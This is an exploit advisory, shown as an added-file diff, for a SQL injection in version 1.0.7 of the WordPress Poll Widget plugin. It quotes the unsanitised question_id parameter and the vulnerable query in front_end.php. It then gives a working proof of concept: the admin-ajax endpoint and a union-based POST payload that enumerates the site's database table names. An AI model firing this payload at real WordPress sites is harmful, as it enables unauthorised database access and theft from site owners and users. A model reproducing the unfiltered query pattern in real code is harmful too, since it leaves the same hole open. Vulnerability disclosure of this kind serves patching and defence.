@@ -1,0 +1,29 @@
+Exploit Title : wordpress poll widget version 1.0.7 SQL Injection vulnerability
+Author         : WICS
+Date             : 7/12/2015
+Software Link  : https://wordpress.org/plugins/polls-widget/
+Affected Version: 1.0.7 and below
+
+
+Overview:
+
+
+Poll widget is wordpress plugin which provide fancy user Polling layout to website users and user can vote according to options provided in specific poll.
+This  plugin has 2000+ active installations.
+Vulnerability exist in front_end.php file in which code is not filtering user supplied data on parameter question_id 
+line no. 36          $question_id=$_POST['question_id'];
+....
+....
+line no. 94-->      $answer=$wpdb->get_results('SELECT `answer_name`,`vote` FROM '.$wpdb->prefix.'polls WHERE question_id='.$question_id,ARRAY_A);
+                print_r(json_encode($answer, JSON_FORCE_OBJECT));
+                
+this script is vulnerable to union based sql injection with column count 2
+
+
+POC
+
+http://localhost/wp-admin/admin-ajax.php?action=pollinsertvalues
+
+in post data, add this 
+
+question_id=1337 union select  group_concat(0x7e,(select(@)from(select(@:=0x00),(select(@)from(information_schema.tables)where table_schema=database() and (@)in(@:=concat(@,0x3C62723E,table_name))))a)),2-- -&poll_answer_securety=4ac4f387e2&date_answers[0]=5
